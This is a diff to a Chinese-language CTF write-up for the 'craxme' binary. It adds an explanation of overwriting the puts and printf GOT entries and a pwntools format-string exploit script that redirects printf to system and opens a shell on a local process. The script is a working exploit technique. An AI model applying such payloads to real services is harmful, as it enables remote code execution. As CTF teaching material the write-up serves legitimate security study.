@@ -120,7 +120,42 @@ shell()
 但调用这两个函数的参数不可控，所以需要复写其他函数的got表 最后发现只有printf函数的参数可控
 那么我们可以将puts的got表覆盖为main函数调用read的地址
 同时将printf的got表覆盖为system
-这样在程序继续执行时就会调用
+这样在程序继续执行时就会调用puts函数 然后跳转到read@main 继续执行一次read和printf
+在执行到printf时真正调用的是system 我们的输入就是system的参数
+
+### exp_craxme3.py
+```python
+from pwn import *
+p = process("./craxme")
+# p = remote("ip",port)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+pritnf_got = 0x804a010
+puts_got = 0x804a018
+read_main = 0x804859B
+system_plt = 0x8048410
+
+payload = p32(puts_got) + p32(puts_got+2) + p32(pritnf_got) + p32(pritnf_got+2)
+payload+= b"%34187c%7$hn%33385c%8$hn%31756c%9$hn%33780c%10$hn"
+
+raw_input("Ther")
+ru("magic :")
+sl(payload)
+
+shell()
+```
 
 
 
